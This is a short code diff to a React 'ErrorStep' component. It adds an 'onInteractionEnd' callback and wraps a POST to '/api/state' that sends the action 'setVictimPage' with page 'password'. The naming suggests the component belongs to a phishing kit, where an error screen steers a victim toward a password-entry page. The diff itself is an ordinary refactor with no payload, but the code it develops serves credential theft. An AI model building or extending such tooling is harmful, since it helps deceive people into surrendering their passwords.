@@ -3,17 +3,24 @@
 import { Button } from "@/components/ui/button";
 import { AlertTriangle } from "lucide-react";
 
-export default function ErrorStep({ errorMessage }: { errorMessage: string }) {
+type ErrorStepProps = {
+  errorMessage: string;
+  onInteractionEnd: (submitAction: () => Promise<void>) => Promise<void>;
+}
+
+export default function ErrorStep({ errorMessage, onInteractionEnd }: ErrorStepProps) {
   const handleTryAgain = async () => {
-     try {
-      await fetch('/api/state', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: 'setVictimPage', page: 'password' }),
-      });
-    } catch (error) {
-       console.error('Failed to proceed');
-    }
+     await onInteractionEnd(async () => {
+        try {
+        await fetch('/api/state', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: 'setVictimPage', page: 'password' }),
+        });
+        } catch (error) {
+        console.error('Failed to proceed');
+        }
+    });
   };
   
   return (
